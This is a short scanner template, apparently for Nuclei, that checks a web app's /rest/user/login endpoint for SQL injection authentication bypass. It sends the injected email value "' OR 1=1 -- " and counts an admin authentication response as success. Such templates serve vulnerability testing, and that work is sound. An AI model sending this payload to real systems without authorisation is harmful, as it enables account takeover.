id: aegis-sqli-login

info:
  name: AEGIS - SQLi Authentication Bypass
  author: aegis
  severity: high

http:
  - method: POST
    path:
      - "{{BaseURL}}/rest/user/login"

    headers:
      Content-Type: application/json
      Accept: application/json

    disable-cookie: true

    body: |
      {
        "email": "' OR 1=1 -- ",
        "password": "abc"
      }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - '"authentication"\s*:\s*\{'

      - type: regex
        part: body
        words:
          - '(?i)"umail"\s*:\s*"[^"]*admin[^"]*"'

       